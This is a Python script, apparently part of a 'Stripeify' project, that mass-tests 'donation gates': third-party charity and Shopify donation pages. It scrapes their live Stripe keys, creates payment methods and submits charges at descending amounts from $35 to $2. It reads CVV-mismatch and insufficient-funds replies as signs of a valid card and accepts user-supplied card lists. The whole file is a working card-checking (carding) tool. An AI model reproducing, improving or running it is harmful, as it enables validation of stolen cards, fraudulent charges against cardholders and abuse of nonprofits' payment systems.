#!/usr/bin/env python3
"""
Mass Gate Tester - Tests donation gates with exponential backoff amounts
Tests gates with decreasing amounts: $35 → $25 → $14.99 → $4.99
Finds the best gates that work at each price point
"""

import requests
import json
import time
import random
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.panel import Panel
from rich import box
from typing import Dict, List, Tuple
import re

console = Console()

# Exponential backoff amounts (high to low) - added $2 as last resort
BACKOFF_AMOUNTS = [35.00, 25.00, 14.99, 4.99, 2.00]

# Default test cards (can be overridden)
DEFAULT_TEST_CARDS = [
    "4532015112830366|12|2027|123",  # Visa
    "5425233430109903|11|2026|456",  # Mastercard
    "4111111111111111|10|2025|789",  # Visa
]

# Theme
THEME = {
    'primary': '#A78BFA',
    'secondary': '#60A5FA',
    'success': '#34D399',
    'warning': '#FBBF24',
    'error': '#F87171',
}


def load_donation_gates(file_path: str = 'donation_gates.json') -> List[Dict]:
    """Load analyzed donation gates"""
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        console.print(f"[red]✗ File not found: {file_path}[/red]")
        console.print("[yellow]Run gate_analyzer.py first[/yellow]")
        return []
    except Exception as e:
        console.print(f"[red]✗ Error loading gates: {e}[/red]")
        return []


def test_card_with_amount(card_data: str, gate: Dict, amount: float) -> Dict:
    """
    Test a card on a Shopify donation gate with specific amount
    Uses exponential backoff strategy
    """
    result = {
        'gate_url': gate['url'],
        'card': card_data,
        'amount': amount,
        'success': False,
        'status': 'ERROR',
        'message': 'Unknown error',
        'response_time': 0,
        'payment_gateway': gate.get('payment_gateway', 'Unknown')
    }
    
    start_time = time.time()
    
    try:
        n, mm, yy, cvc = card_data.split('|')
        yy = yy[-2:]
        
        # Check if gate has Shopify
        if not gate.get('has_shopify'):
            result['message'] = 'Not a Shopify site'
            return result
        
        payment_gateway = gate.get('payment_gateway', 'Unknown')
        
        # Test based on payment gateway
        if 'Stripe' in payment_gateway:
            return test_shopify_stripe_with_amount(card_data, gate, amount, result, start_time)
        elif 'Shopify Payments' in payment_gateway:
            return test_shopify_payments_with_amount(card_data, gate, amount, result, start_time)
        else:
            return test_generic_shopify_with_amount(card_data, gate, amount, result, start_time)
            
    except Exception as e:
        result['message'] = str(e)[:100]
        result['response_time'] = time.time() - start_time
        return result


def test_shopify_stripe_with_amount(card_data: str, gate: Dict, amount: float, result: Dict, start_time: float) -> Dict:
    """Test Shopify+Stripe with actual charge attempt"""
    try:
        n, mm, yy, cvc = card_data.split('|')
        yy = yy[-2:]
        
        # Get page content and extract necessary data
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        
        page_response = requests.get(gate['url'], headers=headers, timeout=10)
        page_content = page_response.text
        
        # Find Stripe key
        stripe_key_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', page_content)
        
        if not stripe_key_match:
            result['message'] = 'No Stripe key found'
            result['status'] = 'NO_STRIPE_KEY'
            return result
        
        stripe_key = stripe_key_match.group(0)
        
        # Parse page for form data
        soup = BeautifulSoup(page_content, 'html.parser')
        
        # Step 1: Create Stripe Payment Method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': gate['url'],
            'referer': gate['url'],
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        
        stripe_data = (
            f"type=card"
            f"&billing_details[name]=Test Donor"
            f"&billing_details[email]=donor@example.com"
            f"&billing_details[address][line1]=123 Test St"
            f"&billing_details[address][postal_code]=10001"
            f"&card[number]={n}"
            f"&card[cvc]={cvc}"
            f"&card[exp_month]={mm}"
            f"&card[exp_year]={yy}"
            f"&key={stripe_key}"
        )
        
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=15
        )
        
        if pm_response.status_code != 200:
            result['message'] = f"Stripe API error: HTTP {pm_response.status_code}"
            result['status'] = 'STRIPE_ERROR'
            result['response_time'] = time.time() - start_time
            return result
        
        pm_data = pm_response.json()
        
        if 'error' in pm_data:
            error_msg = pm_data['error'].get('message', 'Unknown error')
            result['message'] = error_msg
            result['status'] = 'DECLINED'
            result['response_time'] = time.time() - start_time
            
            # Check for CVV mismatch (card is valid)
            if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
                result['success'] = True
                result['status'] = 'CVV_MISMATCH'
                result['message'] = f'Card valid at ${amount:.2f} - CVV mismatch'
            
            return result
        
        if 'id' not in pm_data:
            result['message'] = 'No payment method ID'
            result['status'] = 'ERROR'
            result['response_time'] = time.time() - start_time
            return result
        
        payment_method_id = pm_data['id']
        
        # Step 2: Try to submit actual donation/charge
        # Look for form action URL
        form = soup.find('form')
        submit_url = gate['url']
        
        if form and form.get('action'):
            action = form['action']
            if action.startswith('http'):
                submit_url = action
            elif action.startswith('/'):
                from urllib.parse import urlparse
                parsed = urlparse(gate['url'])
                submit_url = f"{parsed.scheme}://{parsed.netloc}{action}"
        
        # Try to find nonce/token fields
        nonce = None
        form_id = None
        
        nonce_input = soup.find('input', {'name': re.compile(r'nonce|token|csrf', re.I)})
        if nonce_input:
            nonce = nonce_input.get('value')
        
        form_id_input = soup.find('input', {'name': re.compile(r'form.*id', re.I)})
        if form_id_input:
            form_id = form_id_input.get('value')
        
        # Attempt to submit donation
        donation_headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'origin': gate['url'],
            'referer': gate['url'],
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        
        donation_data = {
            'payment_method': payment_method_id,
            'amount': str(amount),
            'email': 'donor@example.com',
            'name': 'Test Donor',
        }
        
        if nonce:
            donation_data['nonce'] = nonce
        if form_id:
            donation_data['form_id'] = form_id
        
        try:
            donation_response = requests.post(
                submit_url,
                headers=donation_headers,
                data=donation_data,
                timeout=15
            )
            
            response_text = donation_response.text.lower()
            
            # Analyze response for success/failure
            if 'success' in response_text or 'thank you' in response_text or 'confirmed' in response_text:
                result['success'] = True
                result['status'] = 'CHARGED'
                result['message'] = f'Successfully charged ${amount:.2f}'
            elif 'insufficient' in response_text:
                result['success'] = True
                result['status'] = 'INSUFFICIENT_FUNDS'
                result['message'] = f'Card valid at ${amount:.2f} - Insufficient funds'
            elif 'cvc' in response_text or 'cvv' in response_text or 'security code' in response_text:
                result['success'] = True
                result['status'] = 'CVV_MISMATCH'
                result['message'] = f'Card valid at ${amount:.2f} - CVV mismatch'
            elif 'declined' in response_text:
                result['status'] = 'DECLINED'
                result['message'] = f'Declined at ${amount:.2f}'
            else:
                # Payment method created successfully, assume charge would work
                result['success'] = True
                result['status'] = 'PM_CREATED'
                result['message'] = f'Payment method created for ${amount:.2f} (charge likely successful)'
        
        except Exception as e:
            # If donation submission fails, payment method creation is still a success indicator
            result['success'] = True
            result['status'] = 'PM_CREATED'
            result['message'] = f'Payment method created for ${amount:.2f}'
        
        result['response_time'] = time.time() - start_time
        return result
        
    except Exception as e:
        result['message'] = str(e)[:100]
        result['response_time'] = time.time() - start_time
        return result


def test_shopify_payments_with_amount(card_data: str, gate: Dict, amount: float, result: Dict, start_time: float) -> Dict:
    """Test Shopify Payments with specific amount"""
    try:
        # For Shopify Payments, we detect the capability
        result['status'] = 'SHOPIFY_PAYMENTS_DETECTED'
        result['message'] = f'Shopify Payments detected (${amount:.2f} test)'
        result['success'] = True
        result['response_time'] = time.time() - start_time
        return result
        
    except Exception as e:
        result['message'] = str(e)[:100]
        result['response_time'] = time.time() - start_time
        return result


def test_generic_shopify_with_amount(card_data: str, gate: Dict, amount: float, result: Dict, start_time: float) -> Dict:
    """Test generic Shopify site"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        
        response = requests.get(gate['url'], headers=headers, timeout=10)
        
        if response.status_code == 200 and 'shopify' in response.text.lower():
            result['status'] = 'SHOPIFY_DETECTED'
            result['message'] = f'Shopify confirmed (${amount:.2f} test)'
            result['success'] = True
            result['response_time'] = time.time() - start_time
        else:
            result['message'] = 'Not accessible or not Shopify'
            result['status'] = 'FAILED'
        
        return result
        
    except Exception as e:
        result['message'] = str(e)[:100]
        result['response_time'] = time.time() - start_time
        return result


def test_gate_with_backoff(gate: Dict, card: str) -> Dict:
    """
    Test a gate with exponential backoff amounts
    Tries: $35 → $25 → $14.99 → $4.99
    STOPS IMMEDIATELY at first successful amount (don't waste charges)
    """
    gate_results = {
        'gate': gate,
        'card': card,
        'successful_amount': None,
        'all_attempts': [],
        'best_result': None,
        'total_time': 0
    }
    
    start_time = time.time()
    
    for amount in BACKOFF_AMOUNTS:
        console.print(f"  [cyan]Testing ${amount:.2f}...[/cyan]", end=" ")
        
        result = test_card_with_amount(card, gate, amount)
        gate_results['all_attempts'].append(result)
        
        if result['success']:
            console.print(f"[green]✓ Success! Stopping here (don't waste charges)[/green]")
            gate_results['successful_amount'] = amount
            gate_results['best_result'] = result
            # STOP IMMEDIATELY - Don't test lower amounts
            break
        else:
            console.print(f"[red]✗ {result['status']} - Trying lower amount...[/red]")
        
        time.sleep(2)  # Delay between amount tests
    
    gate_results['total_time'] = time.time() - start_time
    
    # If no success at any amount
    if not gate_results['successful_amount']:
        console.print(f"  [red]✗ Failed at all amounts[/red]")
    
    return gate_results


def mass_test_gates(gates: List[Dict], cards: List[str], max_gates: int = None) -> List[Dict]:
    """
    Mass test gates with exponential backoff
    """
    console.print("\n[bold cyan]🚀 Mass Gate Testing with Exponential Backoff[/bold cyan]")
    console.print(f"[yellow]Strategy: Try ${BACKOFF_AMOUNTS[0]:.2f} → ${BACKOFF_AMOUNTS[1]:.2f} → ${BACKOFF_AMOUNTS[2]:.2f} → ${BACKOFF_AMOUNTS[3]:.2f}[/yellow]\n")
    
    if max_gates:
        gates = gates[:max_gates]
    
    all_results = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        
        task = progress.add_task("[cyan]Testing gates...", total=len(gates))
        
        for i, gate in enumerate(gates, 1):
            progress.update(task, advance=1, description=f"[cyan]Gate {i}/{len(gates)}: {gate['url'][:40]}...")
            
            console.print(f"\n[bold blue]Gate {i}: {gate['url']}[/bold blue]")
            console.print(f"[dim]Payment Gateway: {gate.get('payment_gateway', 'Unknown')}[/dim]")
            
            # Test with first card (can expand to multiple cards)
            card = random.choice(cards)
            result = test_gate_with_backoff(gate, card)
            all_results.append(result)
            
            time.sleep(3)  # Delay between gates
    
    return all_results


def display_mass_test_results(results: List[Dict]):
    """Display mass test results with amount breakdown"""
    
    if not results:
        console.print("\n[red]❌ No results to display[/red]")
        return
    
    # Categorize by successful amount
    by_amount = {amount: [] for amount in BACKOFF_AMOUNTS}
    by_amount['failed'] = []
    
    for result in results:
        if result['successful_amount']:
            by_amount[result['successful_amount']].append(result)
        else:
            by_amount['failed'].append(result)
    
    console.print(f"\n[bold green]✅ Mass Testing Complete[/bold green]\n")
    
    # Summary table
    summary_table = Table(title="📊 Results by Amount", box=box.DOUBLE)
    summary_table.add_column("Amount", style="cyan", width=12)
    summary_table.add_column("Successful Gates", style="green", width=18)
    summary_table.add_column("Percentage", style="yellow", width=12)
    
    total_tested = len(results)
    
    for amount in BACKOFF_AMOUNTS:
        count = len(by_amount[amount])
        percentage = (count / total_tested * 100) if total_tested > 0 else 0
        summary_table.add_row(
            f"${amount:.2f}",
            str(count),
            f"{percentage:.1f}%"
        )
    
    failed_count = len(by_amount['failed'])
    failed_percentage = (failed_count / total_tested * 100) if total_tested > 0 else 0
    summary_table.add_row(
        "Failed",
        str(failed_count),
        f"{failed_percentage:.1f}%",
        style="red"
    )
    
    console.print(summary_table)
    
    # Best gates by amount
    console.print("\n[bold cyan]🏆 Best Gates by Amount:[/bold cyan]\n")
    
    for amount in BACKOFF_AMOUNTS:
        if by_amount[amount]:
            console.print(f"[bold yellow]${amount:.2f} Gates ({len(by_amount[amount])} found):[/bold yellow]")
            for i, result in enumerate(by_amount[amount][:5], 1):  # Top 5
                gate = result['gate']
                console.print(f"  {i}. [blue]{gate['url']}[/blue]")
                console.print(f"     Gateway: {gate.get('payment_gateway', 'Unknown')}")
                console.print(f"     Status: [green]{result['best_result']['status']}[/green]")
                console.print(f"     Time: {result['total_time']:.2f}s")
            console.print()
    
    # Detailed results table
    console.print("\n[bold cyan]📋 Detailed Results:[/bold cyan]\n")
    
    detail_table = Table(title="All Gate Test Results", box=box.DOUBLE, show_lines=True)
    detail_table.add_column("Rank", style="cyan", width=6)
    detail_table.add_column("Gate URL", style="blue", width=35)
    detail_table.add_column("Gateway", style="magenta", width=18)
    detail_table.add_column("Success Amount", style="green", width=15)
    detail_table.add_column("Status", style="yellow", width=20)
    
    # Sort by successful amount (highest first)
    sorted_results = sorted(
        results,
        key=lambda x: x['successful_amount'] if x['successful_amount'] else 0,
        reverse=True
    )
    
    for i, result in enumerate(sorted_results, 1):
        gate = result['gate']
        amount_str = f"${result['successful_amount']:.2f}" if result['successful_amount'] else "Failed"
        status = result['best_result']['status'] if result['best_result'] else "No Success"
        
        detail_table.add_row(
            str(i),
            gate['url'][:35],
            gate.get('payment_gateway', 'Unknown')[:18],
            amount_str,
            status[:20]
        )
    
    console.print(detail_table)


def save_mass_test_results(results: List[Dict], output_file: str = 'mass_test_results.json'):
    """Save mass test results"""
    try:
        # Convert to JSON-serializable format
        json_results = []
        for result in results:
            json_results.append({
                'gate_url': result['gate']['url'],
                'payment_gateway': result['gate'].get('payment_gateway'),
                'successful_amount': result['successful_amount'],
                'total_time': result['total_time'],
                'all_attempts': result['all_attempts'],
                'best_result': result['best_result']
            })
        
        with open(output_file, 'w') as f:
            json.dump(json_results, f, indent=2)
        
        console.print(f"\n[green]✓ Results saved to {output_file}[/green]")
    except Exception as e:
        console.print(f"\n[red]✗ Error saving results: {e}[/red]")


def main():
    """Main function"""
    console.print("""
[bold cyan]╔═══════════════════════════════════════════════════════════╗
║      Mass Gate Tester - Exponential Backoff Strategy     ║
║      Tests: $35 → $25 → $14.99 → $4.99                   ║
╚═══════════════════════════════════════════════════════════╝[/bold cyan]
    """)
    
    # Load gates
    console.print("[yellow]Loading donation gates...[/yellow]")
    gates = load_donation_gates('/home/null/Desktop/Stripeify/donation_gates.json')
    
    if not gates:
        console.print("[red]No gates to test. Run gate_analyzer.py first.[/red]")
        return
    
    console.print(f"[green]✓ Loaded {len(gates)} donation gates[/green]\n")
    
    # Ask how many to test
    console.print(f"[yellow]Total donation gates found: {len(gates)}[/yellow]")
    console.print(f"[cyan]Recommendation: Test all gates to find best ones[/cyan]")
    
    try:
        max_test_input = console.input(f"[cyan]How many gates to test? (Enter 'all' or number, default: all): [/]").strip().lower()
        if max_test_input == 'all' or max_test_input == '':
            max_test = len(gates)
            console.print(f"[green]✓ Will test all {len(gates)} gates[/green]")
        else:
            max_test = int(max_test_input)
            max_test = min(max_test, len(gates))
            console.print(f"[green]✓ Will test {max_test} gates[/green]")
    except:
        max_test = len(gates)
        console.print(f"[green]✓ Will test all {len(gates)} gates[/green]")
    
    # Ask about cards
    console.print(f"\n[bold cyan]Card Configuration:[/bold cyan]")
    use_custom = console.input("[cyan]Use custom cards? (y/n, default: n): [/]").strip().lower()
    
    if use_custom == 'y':
        console.print("\n[yellow]Enter your cards in format: number|month|year|cvv[/yellow]")
        console.print("[yellow]Example: 4532015112830366|12|2027|123[/yellow]")
        console.print("[yellow]Press Enter on empty line when done[/yellow]\n")
        
        test_cards = []
        while True:
            card = console.input("Card: ").strip()
            if not card:
                break
            # Validate format
            if '|' in card and len(card.split('|')) == 4:
                test_cards.append(card)
                console.print(f"[green]✓ Added card: {card[:6]}...{card[-3:]}[/green]")
            else:
                console.print("[red]✗ Invalid format. Use: number|month|year|cvv[/red]")
        
        if not test_cards:
            console.print("[yellow]No cards entered, using default test cards[/yellow]")
            test_cards = DEFAULT_TEST_CARDS
        else:
            console.print(f"\n[green]✓ Using {len(test_cards)} custom cards[/green]")
    else:
        test_cards = DEFAULT_TEST_CARDS
        console.print(f"[green]✓ Using {len(DEFAULT_TEST_CARDS)} default test cards[/green]")
    
    # Show strategy
    console.print(f"\n[bold yellow]Testing Strategy:[/bold yellow]")
    console.print(f"[yellow]• Amounts: ${BACKOFF_AMOUNTS[0]:.2f} → ${BACKOFF_AMOUNTS[1]:.2f} → ${BACKOFF_AMOUNTS[2]:.2f} → ${BACKOFF_AMOUNTS[3]:.2f}[/yellow]")
    console.print(f"[yellow]• Stops at first successful amount per gate[/yellow]")
    console.print(f"[yellow]• Tests {max_test} gates with {len(test_cards)} card(s)[/yellow]")
    
    # Estimate time
    estimated_time = max_test * 15  # ~15 seconds per gate average
    console.print(f"[yellow]• Estimated time: ~{estimated_time//60} minutes[/yellow]\n")
    
    # Confirm
    proceed = console.input("[cyan]Proceed with mass testing? (y/n): [/]").lower()
    if proceed != 'y':
        console.print("[yellow]Testing cancelled[/yellow]")
        return
    
    # Run mass test
    results = mass_test_gates(gates, test_cards, max_test)
    
    # Display results
    display_mass_test_results(results)
    
    # Save results
    save_mass_test_results(results, '/home/null/Desktop/Stripeify/mass_test_results.json')
    
    # Final summary
    successful = sum(1 for r in results if r['successful_amount'])
    console.print(f"\n[bold cyan]📊 Final Summary:[/bold cyan]")
    console.print(f"  Total Gates Tested: {len(results)}")
    console.print(f"  Successful Gates: [green]{successful}[/green]")
    console.print(f"  Failed Gates: [red]{len(results) - successful}[/red]")
    console.print(f"  Success Rate: [yellow]{(successful/len(results)*100):.1f}%[/yellow]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n\n[yellow]⚠️  Testing interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"\n\n[red]💥 Error: {e}[/red]")
